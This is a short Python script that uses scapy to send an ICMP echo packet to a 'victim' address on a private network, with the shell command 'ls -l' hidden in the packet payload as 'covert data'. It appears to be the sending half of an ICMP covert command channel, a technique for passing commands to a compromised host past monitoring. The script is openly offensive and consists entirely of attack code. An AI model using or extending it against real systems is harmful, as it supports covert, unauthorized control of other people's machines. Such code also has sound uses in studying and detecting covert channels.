from scapy.all import *
import sys

# Target information
victim_ip = "192.168.1.184" 

covert_data = "ls -l"  

# Crafts the ICMP packet with the covert data embedded in the payload
packet = IP(dst=victim_ip) / ICMP(type=8) / Raw(load=covert_data)

# Sends the packet
send(packet)
print(f"Covert ICMP packet sent to {victim_ip} with data: '{covert_data}'")
